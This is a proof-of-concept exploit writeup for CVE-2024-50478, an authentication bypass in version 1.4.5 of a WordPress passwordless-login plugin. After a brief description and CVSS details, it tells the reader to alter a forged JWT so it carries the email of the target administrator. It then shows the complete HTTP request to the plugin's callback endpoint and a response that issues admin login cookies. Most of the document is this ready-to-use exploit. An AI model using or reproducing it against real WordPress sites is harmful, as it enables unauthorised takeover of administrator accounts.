# CVE-2024-50478
1-Click Login: Passwordless Authentication 1.4.5 - Authentication Bypass via Account Takeover

# Description:
The 1-Click Login: Passwordless Authentication plugin for WordPress is vulnerable to authentication bypass in version 1.4.5. This is due to the plugin not properly verifying a user's identity prior to authenticating them. This makes it possible for unauthenticated attackers to log in as other users, such as administrators, granted they have access to an email.


```
CVE: CVE-2024-50478
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 9.8
Slugs: swoop-password-free-authentication
```

Note this JWT uses admin@admin.com as the admin email address take the token to jwt.io and alter it to the admin email address you want to use.


POC
---

Request

```
GET /wp-json/swoop/v1/callback?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmaXJzdF9uYW1lIjoiYWRtaW4iLCJlbWFpbCI6ImFkbWluQGFkbWluLmNvbSIsImxhc3RfbmFtZSI6ImFkbWluIn0.Dt6LWMIg64KHHinChTI9v8nElo9L_9RhjdqUmFZTTeQ HTTP/1.1
Host: kubernetes.docker.internal
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://kubernetes.docker.internal/wp-admin/edit.php?post_type=product&page=woobe
X-Requested-With: XMLHttpRequest
Origin: http://kubernetes.docker.internal
Connection: keep-alive
```

Response

```
HTTP/1.1 200 OK
Date: Tue, 05 Nov 2024 22:03:33 GMT
Server: Apache/2.4.57 (Debian)
X-Powered-By: PHP/8.2.13
Set-Cookie: wordpress_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1731017014%7CmVk9jvTvKdWg1CySsAviyqyxYxnyZSXxnOtCaCg1O5p%7C257a852c3899cd432346f69c352f6e18806c938aa1f5fca8cb12e92f1b2e483c; path=/wp-content/plugins; HttpOnly
Set-Cookie: wordpress_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1731017014%7CmVk9jvTvKdWg1CySsAviyqyxYxnyZSXxnOtCaCg1O5p%7C257a852c3899cd432346f69c352f6e18806c938aa1f5fca8cb12e92f1b2e483c; path=/wp-admin; HttpOnly
Set-Cookie: wordpress_logged_in_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1731017014%7CmVk9jvTvKdWg1CySsAviyqyxYxnyZSXxnOtCaCg1O5p%7C4f2126838a4c2b94e19df68d77aaffd20c2c56de80b553f5ecb7d4ae31dcc3e6; path=/; HttpOnly
Content-Length: 65
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

{"redirect_to":"http:\/\/kubernetes.docker.internal\/wp-admin\/"}
```
